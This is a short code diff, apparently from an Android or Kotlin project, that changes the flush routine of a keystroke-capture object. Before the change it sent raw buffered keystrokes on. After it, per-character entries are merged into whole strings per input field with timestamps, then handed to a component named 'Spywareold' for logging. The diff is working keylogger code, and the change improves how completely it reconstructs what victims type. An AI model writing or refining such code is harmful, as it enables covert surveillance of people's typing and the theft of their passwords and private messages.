@@ -18,12 +18,20 @@ object KeystrokeCapture {
         ))
     }
 
-    // Sends buffered keystrokes to the server then clears the buffer
+    // Consolidates per-character entries into one entry per field, then sends and clears
     fun flush(uid: String) {
         if (buffer.isEmpty()) return
-        val snapshot = buffer.toList()
+        val consolidated = buffer
+            .groupBy { it["field"] as String }
+            .map { (field, entries) ->
+                mapOf(
+                    "field"     to field,
+                    "chars"     to entries.joinToString("") { it["chars"] as String },
+                    "timestamp" to (entries.first()["timestamp"] as Long)
+                )
+            }
         buffer.clear()
-        Spywareold.logKeystrokes(uid, snapshot)
+        Spywareold.logKeystrokes(uid, consolidated)
     }
 }
 
